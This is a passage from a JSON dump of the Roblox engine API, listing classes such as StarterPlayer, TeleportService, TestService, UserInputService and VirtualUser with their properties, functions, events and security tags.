,{"ReturnType":"void","Arguments":[{"Type":"SoundType","Name":"sound","Default":null}],"Name":"PlayStockSound","tags":["RobloxScriptSecurity"],"Class":"SoundService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"ListenerType","Name":"listenerType","Default":null},{"Type":"Tuple","Name":"listener","Default":null}],"Name":"SetListener","tags":[],"Class":"SoundService","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"Sparkles","tags":[]},{"ValueType":"Color3","type":"Property","Name":"Color","tags":["hidden"],"Class":"Sparkles"},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"Sparkles"},{"ValueType":"Color3","type":"Property","Name":"SparkleColor","tags":[],"Class":"Sparkles"},{"Superclass":"Instance","type":"Class","Name":"SpawnerService","tags":[]},{"Superclass":"Instance","type":"Class","Name":"StarterGear","tags":[]},{"Superclass":"Instance","type":"Class","Name":"StarterPlayer","tags":[]},{"ValueType":"bool","type":"Property","Name":"AutoJumpEnabled","tags":[],"Class":"StarterPlayer"},{"ValueType":"float","type":"Property","Name":"CameraMaxZoomDistance","tags":[],"Class":"StarterPlayer"},{"ValueType":"float","type":"Property","Name":"CameraMinZoomDistance","tags":[],"Class":"StarterPlayer"},{"ValueType":"CameraMode","type":"Property","Name":"CameraMode","tags":[],"Class":"StarterPlayer"},{"ValueType":"DevCameraOcclusionMode","type":"Property","Name":"DevCameraOcclusionMode","tags":[],"Class":"StarterPlayer"},{"ValueType":"DevComputerCameraMovementMode","type":"Property","Name":"DevComputerCameraMovementMode","tags":[],"Class":"StarterPlayer"},{"ValueType":"DevComputerMovementMode","type":"Property","Name":"DevComputerMovementMode","tags":[],"Class":"StarterPlayer"},{"ValueType":"DevTouchCameraMovementMode","type":"Property","Name":"DevTouchCameraMovementMode","tags":[],"Class":"StarterPlayer"},{"ValueType":"DevTouchMovementMode","type":"Property","Name":"DevTouchMovementMode","tags":[],"Class":"StarterPlayer"},{"ValueType":"bool","type":"Property","Name":"EnableMouseLockOption","tags":[],"Class":"StarterPlayer"},{"ValueType":"float","type":"Property","Name":"HealthDisplayDistance","tags":[],"Class":"StarterPlayer"},{"ValueType":"bool","type":"Property","Name":"LoadCharacterAppearance","tags":[],"Class":"StarterPlayer"},{"ValueType":"float","type":"Property","Name":"NameDisplayDistance","tags":[],"Class":"StarterPlayer"},{"Superclass":"Instance","type":"Class","Name":"StarterPlayerScripts","tags":[]},{"Superclass":"StarterPlayerScripts","type":"Class","Name":"StarterCharacterScripts","tags":[]},{"Superclass":"Instance","type":"Class","Name":"Stats","tags":["notCreatable"]},{"ValueType":"double","type":"Property","Name":"MinReportInterval","tags":["RobloxScriptSecurity"],"Class":"Stats"},{"ValueType":"string","type":"Property","Name":"ReporterType","tags":["RobloxScriptSecurity"],"Class":"Stats"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"category","Default":null},{"Type":"Dictionary","Name":"data","Default":null}],"Name":"Report","tags":["RobloxScriptSecurity"],"Class":"Stats","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ReportJobsStepWindow","tags":["RobloxScriptSecurity"],"Class":"Stats","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"includeJobs","Default":"false"}],"Name":"ReportTaskScheduler","tags":["RobloxScriptSecurity"],"Class":"Stats","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetReportUrl","tags":["RobloxScriptSecurity"],"Class":"Stats","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"StatsItem","tags":[]},{"ReturnType":"double","Arguments":[],"Name":"GetValue","tags":["PluginSecurity"],"Class":"StatsItem","type":"Function"},{"ReturnType":"string","Arguments":[],"Name":"GetValueString","tags":["PluginSecurity"],"Class":"StatsItem","type":"Function"},{"Superclass":"StatsItem","type":"Class","Name":"ProfilingItem","tags":[]},{"ReturnType":"Tuple","Arguments":[{"Type":"double","Name":"window","Default":"0"}],"Name":"GetTimes","tags":["PluginSecurity"],"Class":"ProfilingItem","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"int","Name":"frames","Default":"1"}],"Name":"GetTimesForFrames","tags":["PluginSecurity"],"Class":"ProfilingItem","type":"Function"},{"Superclass":"StatsItem","type":"Class","Name":"RunningAverageItemDouble","tags":[]},{"Superclass":"StatsItem","type":"Class","Name":"RunningAverageItemInt","tags":[]},{"Superclass":"StatsItem","type":"Class","Name":"RunningAverageTimeIntervalItem","tags":[]},{"Superclass":"StatsItem","type":"Class","Name":"TotalCountTimeIntervalItem","tags":[]},{"Superclass":"Instance","type":"Class","Name":"StringValue","tags":[]},{"ValueType":"string","type":"Property","Name":"Value","tags":[],"Class":"StringValue"},{"Arguments":[{"Name":"value","Type":"string"}],"Name":"Changed","tags":[],"Class":"StringValue","type":"Event"},{"Arguments":[{"Name":"value","Type":"string"}],"Name":"changed","tags":["deprecated"],"Class":"StringValue","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"StudioTool","tags":[]},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"StudioTool"},{"Arguments":[],"Name":"Activated","tags":[],"Class":"StudioTool","type":"Event"},{"Arguments":[],"Name":"Deactivated","tags":[],"Class":"StudioTool","type":"Event"},{"Arguments":[{"Name":"mouse","Type":"Instance"}],"Name":"Equipped","tags":[],"Class":"StudioTool","type":"Event"},{"Arguments":[],"Name":"Unequipped","tags":[],"Class":"StudioTool","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"TaskScheduler","tags":[]},{"ValueType":"bool","type":"Property","Name":"AreArbitersThrottled","tags":[],"Class":"TaskScheduler"},{"ValueType":"ConcurrencyModel","type":"Property","Name":"Concurrency","tags":[],"Class":"TaskScheduler"},{"ValueType":"double","type":"Property","Name":"NumRunningJobs","tags":["readonly"],"Class":"TaskScheduler"},{"ValueType":"double","type":"Property","Name":"NumSleepingJobs","tags":["readonly"],"Class":"TaskScheduler"},{"ValueType":"double","type":"Property","Name":"NumWaitingJobs","tags":["readonly"],"Class":"TaskScheduler"},{"ValueType":"PriorityMethod","type":"Property","Name":"PriorityMethod","tags":[],"Class":"TaskScheduler"},{"ValueType":"double","type":"Property","Name":"SchedulerDutyCycle","tags":["readonly"],"Class":"TaskScheduler"},{"ValueType":"double","type":"Property","Name":"SchedulerRate","tags":["readonly"],"Class":"TaskScheduler"},{"ValueType":"SleepAdjustMethod","type":"Property","Name":"SleepAdjustMethod","tags":[],"Class":"TaskScheduler"},{"ValueType":"double","type":"Property","Name":"ThreadAffinity","tags":["readonly"],"Class":"TaskScheduler"},{"ValueType":"ThreadPoolConfig","type":"Property","Name":"ThreadPoolConfig","tags":[],"Class":"TaskScheduler"},{"ValueType":"int","type":"Property","Name":"ThreadPoolSize","tags":["readonly"],"Class":"TaskScheduler"},{"ValueType":"double","type":"Property","Name":"ThrottledJobSleepTime","tags":[],"Class":"TaskScheduler"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"exclusive","Default":"true"},{"Type":"double","Name":"fps","Default":"30"}],"Name":"AddDummyJob","tags":["LocalUserSecurity"],"Class":"TaskScheduler","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"double","Name":"timeSlice","Default":null},{"Type":"int","Name":"numShare","Default":null}],"Name":"SetThreadShare","tags":["LocalUserSecurity","deprecated"],"Class":"TaskScheduler","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"Team","tags":[]},{"ValueType":"bool","type":"Property","Name":"AutoAssignable","tags":[],"Class":"Team"},{"ValueType":"bool","type":"Property","Name":"AutoColorCharacters","tags":["deprecated"],"Class":"Team"},{"ValueType":"int","type":"Property","Name":"Score","tags":["deprecated"],"Class":"Team"},{"ValueType":"BrickColor","type":"Property","Name":"TeamColor","tags":[],"Class":"Team"},{"Superclass":"Instance","type":"Class","Name":"Teams","tags":["notCreatable"]},{"ReturnType":"Objects","Arguments":[],"Name":"GetTeams","tags":[],"Class":"Teams","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"RebalanceTeams","tags":["deprecated"],"Class":"Teams","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"TeleportService","tags":[]},{"ValueType":"bool","type":"Property","Name":"CustomizedTeleportUI","tags":["deprecated"],"Class":"TeleportService"},{"ReturnType":"Variant","Arguments":[],"Name":"GetLocalPlayerTeleportData","tags":[],"Class":"TeleportService","type":"Function"},{"ReturnType":"Variant","Arguments":[{"Type":"string","Name":"setting","Default":null}],"Name":"GetTeleportSetting","tags":[],"Class":"TeleportService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"setting","Default":null},{"Type":"Variant","Name":"value","Default":null}],"Name":"SetTeleportSetting","tags":[],"Class":"TeleportService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"placeId","Default":null},{"Type":"Instance","Name":"player","Default":"nil"},{"Type":"Variant","Name":"teleportData","Default":null},{"Type":"Instance","Name":"customLoadingScreen","Default":"nil"}],"Name":"Teleport","tags":[],"Class":"TeleportService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"TeleportCancel","tags":["RobloxScriptSecurity"],"Class":"TeleportService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"placeId","Default":null},{"Type":"string","Name":"instanceId","Default":null},{"Type":"Instance","Name":"player","Default":"nil"},{"Type":"string","Name":"spawnName","Default":""},{"Type":"Variant","Name":"teleportData","Default":null},{"Type":"Instance","Name":"customLoadingScreen","Default":"nil"}],"Name":"TeleportToPlaceInstance","tags":[],"Class":"TeleportService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"placeId","Default":null},{"Type":"string","Name":"reservedServerAccessCode","Default":null},{"Type":"Objects","Name":"players","Default":null},{"Type":"string","Name":"spawnName","Default":""},{"Type":"Variant","Name":"teleportData","Default":null},{"Type":"Instance","Name":"customLoadingScreen","Default":"nil"}],"Name":"TeleportToPrivateServer","tags":[],"Class":"TeleportService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"placeId","Default":null},{"Type":"string","Name":"spawnName","Default":null},{"Type":"Instance","Name":"player","Default":"nil"},{"Type":"Variant","Name":"teleportData","Default":null},{"Type":"Instance","Name":"customLoadingScreen","Default":"nil"}],"Name":"TeleportToSpawnByName","tags":[],"Class":"TeleportService","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetPlayerPlaceInstanceAsync","tags":[],"Class":"TeleportService","type":"YieldFunction"},{"ReturnType":"string","Arguments":[{"Type":"int","Name":"placeId","Default":null}],"Name":"ReserveServer","tags":[],"Class":"TeleportService","type":"YieldFunction"},{"Arguments":[{"Name":"loadingGui","Type":"Instance"},{"Name":"dataTable","Type":"Variant"}],"Name":"LocalPlayerArrivedFromTeleport","tags":[],"Class":"TeleportService","type":"Event"},{"ReturnType":"bool","Arguments":[{"Name":"message","Type":"string"},{"Name":"placeId","Type":"int"},{"Name":"spawnName","Type":"string"}],"Name":"ConfirmationCallback","tags":["RobloxScriptSecurity","noyield"],"Class":"TeleportService","type":"Callback"},{"ReturnType":"void","Arguments":[{"Name":"message","Type":"string"}],"Name":"ErrorCallback","tags":["RobloxScriptSecurity","noyield"],"Class":"TeleportService","type":"Callback"},{"Superclass":"Instance","type":"Class","Name":"TerrainRegion","tags":[]},{"ValueType":"bool","type":"Property","Name":"IsSmooth","tags":["readonly"],"Class":"TerrainRegion"},{"ValueType":"Vector3","type":"Property","Name":"SizeInCells","tags":["readonly"],"Class":"TerrainRegion"},{"ReturnType":"void","Arguments":[],"Name":"ConvertToSmooth","tags":["PluginSecurity"],"Class":"TerrainRegion","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"TestService","tags":[]},{"ValueType":"bool","type":"Property","Name":"AutoRuns","tags":[],"Class":"TestService"},{"ValueType":"string","type":"Property","Name":"Description","tags":[],"Class":"TestService"},{"ValueType":"int","type":"Property","Name":"ErrorCount","tags":["readonly"],"Class":"TestService"},{"ValueType":"bool","type":"Property","Name":"Is30FpsThrottleEnabled","tags":[],"Class":"TestService"},{"ValueType":"bool","type":"Property","Name":"IsPhysicsEnvironmentalThrottled","tags":[],"Class":"TestService"},{"ValueType":"bool","type":"Property","Name":"IsSleepAllowed","tags":[],"Class":"TestService"},{"ValueType":"int","type":"Property","Name":"NumberOfPlayers","tags":[],"Class":"TestService"},{"ValueType":"double","type":"Property","Name":"SimulateSecondsLag","tags":[],"Class":"TestService"},{"ValueType":"int","type":"Property","Name":"TestCount","tags":["readonly"],"Class":"TestService"},{"ValueType":"double","type":"Property","Name":"Timeout","tags":[],"Class":"TestService"},{"ValueType":"int","type":"Property","Name":"WarnCount","tags":["readonly"],"Class":"TestService"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"condition","Default":null},{"Type":"string","Name":"description","Default":null},{"Type":"Instance","Name":"source","Default":"nil"},{"Type":"int","Name":"line","Default":"0"}],"Name":"Check","tags":[],"Class":"TestService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"text","Default":null},{"Type":"Instance","Name":"source","Default":"nil"},{"Type":"int","Name":"line","Default":"0"}],"Name":"Checkpoint","tags":[],"Class":"TestService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Done","tags":[],"Class":"TestService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"description","Default":null},{"Type":"Instance","Name":"source","Default":"nil"},{"Type":"int","Name":"line","Default":"0"}],"Name":"Error","tags":[],"Class":"TestService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"description","Default":null},{"Type":"Instance","Name":"source","Default":"nil"},{"Type":"int","Name":"line","Default":"0"}],"Name":"Fail","tags":[],"Class":"TestService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"text","Default":null},{"Type":"Instance","Name":"source","Default":"nil"},{"Type":"int","Name":"line","Default":"0"}],"Name":"Message","tags":[],"Class":"TestService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"condition","Default":null},{"Type":"string","Name":"description","Default":null},{"Type":"Instance","Name":"source","Default":"nil"},{"Type":"int","Name":"line","Default":"0"}],"Name":"Require","tags":[],"Class":"TestService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"condition","Default":null},{"Type":"string","Name":"description","Default":null},{"Type":"Instance","Name":"source","Default":"nil"},{"Type":"int","Name":"line","Default":"0"}],"Name":"Warn","tags":[],"Class":"TestService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Run","tags":["PluginSecurity"],"Class":"TestService","type":"YieldFunction"},{"Arguments":[{"Name":"condition","Type":"bool"},{"Name":"text","Type":"string"},{"Name":"script","Type":"Instance"},{"Name":"line","Type":"int"}],"Name":"ServerCollectConditionalResult","tags":[],"Class":"TestService","type":"Event"},{"Arguments":[{"Name":"text","Type":"string"},{"Name":"script","Type":"Instance"},{"Name":"line","Type":"int"}],"Name":"ServerCollectResult","tags":[],"Class":"TestService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"TextService","tags":["notCreatable"]},{"ReturnType":"Vector2","Arguments":[{"Type":"string","Name":"string","Default":null},{"Type":"int","Name":"fontSize","Default":null},{"Type":"Font","Name":"font","Default":null},{"Type":"Vector2","Name":"frameSize","Default":null}],"Name":"GetTextSize","tags":["RobloxScriptSecurity"],"Class":"TextService","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"TimerService","tags":["notCreatable"]},{"Superclass":"Instance","type":"Class","Name":"Toolbar","tags":[]},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"text","Default":null},{"Type":"string","Name":"tooltip","Default":null},{"Type":"string","Name":"iconname","Default":null}],"Name":"CreateButton","tags":["PluginSecurity"],"Class":"Toolbar","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"TouchInputService","tags":[]},{"Superclass":"Instance","type":"Class","Name":"TouchTransmitter","tags":["notCreatable","notbrowsable"]},{"Superclass":"Instance","type":"Class","Name":"TweenService","tags":[]},{"Superclass":"Instance","type":"Class","Name":"UserGameSettings","tags":[]},{"ValueType":"bool","type":"Property","Name":"AllTutorialsDisabled","tags":["RobloxScriptSecurity"],"Class":"UserGameSettings"},{"ValueType":"CustomCameraMode","type":"Property","Name":"CameraMode","tags":["RobloxScriptSecurity"],"Class":"UserGameSettings"},{"ValueType":"ComputerCameraMovementMode","type":"Property","Name":"ComputerCameraMovementMode","tags":[],"Class":"UserGameSettings"},{"ValueType":"ComputerMovementMode","type":"Property","Name":"ComputerMovementMode","tags":[],"Class":"UserGameSettings"},{"ValueType":"ControlMode","type":"Property","Name":"ControlMode","tags":[],"Class":"UserGameSettings"},{"ValueType":"bool","type":"Property","Name":"Fullscreen","tags":["RobloxScriptSecurity"],"Class":"UserGameSettings"},{"ValueType":"UploadSetting","type":"Property","Name":"ImageUploadPromptBehavior","tags":["RobloxScriptSecurity"],"Class":"UserGameSettings"},{"ValueType":"float","type":"Property","Name":"MasterVolume","tags":[],"Class":"UserGameSettings"},{"ValueType":"float","type":"Property","Name":"MouseSensitivity","tags":[],"Class":"UserGameSettings"},{"ValueType":"RotationType","type":"Property","Name":"RotationType","tags":[],"Class":"UserGameSettings"},{"ValueType":"SavedQualitySetting","type":"Property","Name":"SavedQualityLevel","tags":[],"Class":"UserGameSettings"},{"ValueType":"TouchCameraMovementMode","type":"Property","Name":"TouchCameraMovementMode","tags":[],"Class":"UserGameSettings"},{"ValueType":"TouchMovementMode","type":"Property","Name":"TouchMovementMode","tags":[],"Class":"UserGameSettings"},{"ValueType":"bool","type":"Property","Name":"UsedHideHudShortcut","tags":["RobloxScriptSecurity"],"Class":"UserGameSettings"},{"ValueType":"int","type":"Property","Name":"VRRotationIntensity","tags":["RobloxScriptSecurity"],"Class":"UserGameSettings"},{"ValueType":"UploadSetting","type":"Property","Name":"VideoUploadPromptBehavior","tags":["RobloxScriptSecurity"],"Class":"UserGameSettings"},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"tutorialId","Default":null}],"Name":"GetTutorialState","tags":["RobloxScriptSecurity"],"Class":"UserGameSettings","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"InFullScreen","tags":[],"Class":"UserGameSettings","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"InStudioMode","tags":[],"Class":"UserGameSettings","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"tutorialId","Default":null},{"Type":"bool","Name":"value","Default":null}],"Name":"SetTutorialState","tags":["RobloxScriptSecurity"],"Class":"UserGameSettings","type":"Function"},{"Arguments":[{"Name":"isFullscreen","Type":"bool"}],"Name":"FullscreenChanged","tags":[],"Class":"UserGameSettings","type":"Event"},{"Arguments":[{"Name":"isStudioMode","Type":"bool"}],"Name":"StudioModeChanged","tags":[],"Class":"UserGameSettings","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"UserInputService","tags":["notCreatable"]},{"ValueType":"bool","type":"Property","Name":"AccelerometerEnabled","tags":["readonly"],"Class":"UserInputService"},{"ValueType":"bool","type":"Property","Name":"GamepadEnabled","tags":["readonly"],"Class":"UserInputService"},{"ValueType":"bool","type":"Property","Name":"GyroscopeEnabled","tags":["readonly"],"Class":"UserInputService"},{"ValueType":"bool","type":"Property","Name":"KeyboardEnabled","tags":["readonly"],"Class":"UserInputService"},{"ValueType":"bool","type":"Property","Name":"ModalEnabled","tags":[],"Class":"UserInputService"},{"ValueType":"MouseBehavior","type":"Property","Name":"MouseBehavior","tags":[],"Class":"UserInputService"},{"ValueType":"bool","type":"Property","Name":"MouseEnabled","tags":["readonly"],"Class":"UserInputService"},{"ValueType":"bool","type":"Property","Name":"MouseIconEnabled","tags":[],"Class":"UserInputService"},{"ValueType":"OverrideMouseIconBehavior","type":"Property","Name":"OverrideMouseIconBehavior","tags":["RobloxScriptSecurity"],"Class":"UserInputService"},{"ValueType":"bool","type":"Property","Name":"TouchEnabled","tags":["readonly"],"Class":"UserInputService"},{"ValueType":"CoordinateFrame","type":"Property","Name":"UserHeadCFrame","tags":["deprecated","readonly"],"Class":"UserInputService"},{"ValueType":"bool","type":"Property","Name":"VREnabled","tags":["readonly"],"Class":"UserInputService"},{"ReturnType":"bool","Arguments":[{"Type":"UserInputType","Name":"gamepadNum","Default":null},{"Type":"KeyCode","Name":"gamepadKeyCode","Default":null}],"Name":"GamepadSupports","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetConnectedGamepads","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"GetDeviceAcceleration","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"GetDeviceGravity","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"Tuple","Arguments":[],"Name":"GetDeviceRotation","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"GetFocusedTextBox","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"UserInputType","Name":"gamepadNum","Default":null}],"Name":"GetGamepadConnected","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"Array","Arguments":[{"Type":"UserInputType","Name":"gamepadNum","Default":null}],"Name":"GetGamepadState","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetKeysPressed","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"UserInputType","Arguments":[],"Name":"GetLastInputType","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetNavigationGamepads","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"Platform","Arguments":[],"Name":"GetPlatform","tags":["RobloxScriptSecurity"],"Class":"UserInputService","type":"Function"},{"ReturnType":"Array","Arguments":[{"Type":"UserInputType","Name":"gamepadNum","Default":null}],"Name":"GetSupportedGamepadKeyCodes","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"CoordinateFrame","Arguments":[{"Type":"UserCFrame","Name":"type","Default":null}],"Name":"GetUserCFrame","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"KeyCode","Name":"keyCode","Default":null}],"Name":"IsKeyDown","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"UserInputType","Name":"gamepadEnum","Default":null}],"Name":"IsNavigationGamepad","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"RecenterUserHeadCFrame","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"UserInputType","Name":"gamepadEnum","Default":null},{"Type":"bool","Name":"enabled","Default":null}],"Name":"SetNavigationGamepad","tags":[],"Class":"UserInputService","type":"Function"},{"Arguments":[{"Name":"acceleration","Type":"Instance"}],"Name":"DeviceAccelerationChanged","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"gravity","Type":"Instance"}],"Name":"DeviceGravityChanged","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"rotation","Type":"Instance"},{"Name":"cframe","Type":"CoordinateFrame"}],"Name":"DeviceRotationChanged","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"gamepadNum","Type":"UserInputType"}],"Name":"GamepadConnected","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"gamepadNum","Type":"UserInputType"}],"Name":"GamepadDisconnected","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"input","Type":"Instance"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"InputBegan","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"input","Type":"Instance"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"InputChanged","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"input","Type":"Instance"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"InputEnded","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[],"Name":"JumpRequest","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"lastInputType","Type":"UserInputType"}],"Name":"LastInputTypeChanged","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"textboxReleased","Type":"Instance"}],"Name":"TextBoxFocusReleased","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"textboxFocused","Type":"Instance"}],"Name":"TextBoxFocused","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"touch","Type":"Instance"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"TouchEnded","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"touchPositions","Type":"Array"},{"Name":"state","Type":"UserInputState"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"TouchLongPress","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"touch","Type":"Instance"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"TouchMoved","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"touchPositions","Type":"Array"},{"Name":"totalTranslation","Type":"Vector2"},{"Name":"velocity","Type":"Vector2"},{"Name":"state","Type":"UserInputState"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"TouchPan","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"touchPositions","Type":"Array"},{"Name":"scale","Type":"float"},{"Name":"velocity","Type":"float"},{"Name":"state","Type":"UserInputState"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"TouchPinch","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"touchPositions","Type":"Array"},{"Name":"rotation","Type":"float"},{"Name":"velocity","Type":"float"},{"Name":"state","Type":"UserInputState"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"TouchRotate","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"touch","Type":"Instance"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"TouchStarted","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"swipeDirection","Type":"SwipeDirection"},{"Name":"numberOfTouches","Type":"int"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"TouchSwipe","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"touchPositions","Type":"Array"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"TouchTap","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"type","Type":"UserCFrame"},{"Name":"value","Type":"CoordinateFrame"}],"Name":"UserCFrameChanged","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[],"Name":"WindowFocusReleased","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[],"Name":"WindowFocused","tags":[],"Class":"UserInputService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"Vector3Value","tags":[]},{"ValueType":"Vector3","type":"Property","Name":"Value","tags":[],"Class":"Vector3Value"},{"Arguments":[{"Name":"value","Type":"Vector3"}],"Name":"Changed","tags":[],"Class":"Vector3Value","type":"Event"},{"Arguments":[{"Name":"value","Type":"Vector3"}],"Name":"changed","tags":["deprecated"],"Class":"Vector3Value","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"VirtualUser","tags":["notCreatable"]},{"ReturnType":"void","Arguments":[{"Type":"Vector2","Name":"position","Default":null},{"Type":"CoordinateFrame","Name":"camera","Default":"Identity"}],"Name":"Button1Down","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector2","Name":"position","Default":null},{"Type":"CoordinateFrame","Name":"camera","Default":"Identity"}],"Name":"Button1Up","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector2","Name":"position","Default":null},{"Type":"CoordinateFrame","Name":"camera","Default":"Identity"}],"Name":"Button2Down","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector2","Name":"position","Default":null},{"Type":"CoordinateFrame","Name":"camera","Default":"Identity"}],"Name":"Button2Up","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"CaptureController","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector2","Name":"position","Default":null},{"Type":"CoordinateFrame","Name":"camera","Default":"Identity"}],"Name":"ClickButton1","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector2","Name":"position","Default":null},{"Type":"CoordinateFrame","Name":"camera","Default":"Identity"}],"Name":"ClickButton2","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector2","Name":"position","Default":null},{"Type":"CoordinateFrame","Name":"camera","Default":"Identity"}],"Name":"MoveMouse","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"SetKeyDown","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"SetKeyUp","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"StartRecording","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"string","Arguments":[],"Name":"StopRecording","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"